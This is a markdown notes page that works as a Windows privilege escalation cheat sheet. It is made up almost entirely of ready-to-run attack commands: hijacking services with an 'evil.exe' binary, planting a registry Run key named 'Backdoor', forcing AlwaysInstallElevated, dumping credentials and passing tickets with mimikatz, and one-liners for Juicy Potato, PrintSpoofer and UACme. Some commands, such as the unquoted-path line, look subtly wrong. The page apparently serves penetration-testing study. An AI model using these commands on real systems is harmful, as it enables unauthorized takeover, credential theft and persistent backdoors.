---
layout: notes
permalink: /notes/windows/privesc/
title: Windows Privilege Escalation
---

# Windows Privilege Escalation

## Service Misconfigurations
```powershell
# Query service config
sc qc <service>

# Get service path
wmic service get name,displayname,pathname,startmode

# Check permissions
accesschk.exe -uwdqs <service>

# Replace service binary
copy /b c:\\evil.exe c:\\windows\\system32\\service.exe

# Restart service
net stop <service>
net start <service>

# Modify service path
sc config <service> binPath= "c:\\evil.exe"
```

## Unquoted Service Paths
```powershell
# Find unquoted paths
wmic service get name,pathname | findstr /i " "

# Exploit unquoted path
sc config <service> binPath= "c:\\evil.exe c:\\windows\\system32\\cmd.exe"
```

## Token Manipulation
```powershell
# List privileges
whoami /priv

# Run as another user
Runas /user:<admin> cmd.exe

# Dump credentials
mimikatz.exe "sekurlsa::logonpasswords"

# Pass-the-Ticket
mimikatz.exe "kerberos::ptt <ticket.kirbi>"

# Token theft
Incognito.exe
```

## Registry Exploits
```powershell
# Check auto-run keys
reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

# Add auto-run key
reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d c:\\evil.exe

# Check AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer

# Add elevated install key
reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
```

## Tools
- PowerUp: ``` Import-Module .\PowerUp.ps1; Invoke-AllChecks ```
- SharpUp: ``` SharpUp.exe ```
- Watson: ``` Watson.exe ```
- Juicy Potato: ``` juicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * ```
- Seatbelt: ``` Seatbelt.exe -group=all ```
- PowerSploit: ``` Import-Module .\PowerSploit.ps1; Get-ProcessTokenPrivilege ```
- UACme: ``` uacme.exe ```
- PrintSpoofer: ``` PrintSpoofer.exe -i -c cmd ```

## Local PrivEsc MindMap
<iframe src='https://www.xmind.app/embed/YFFcN8/' width='750' height='422' frameborder='0' scrolling='no' allowfullscreen="true"></iframe>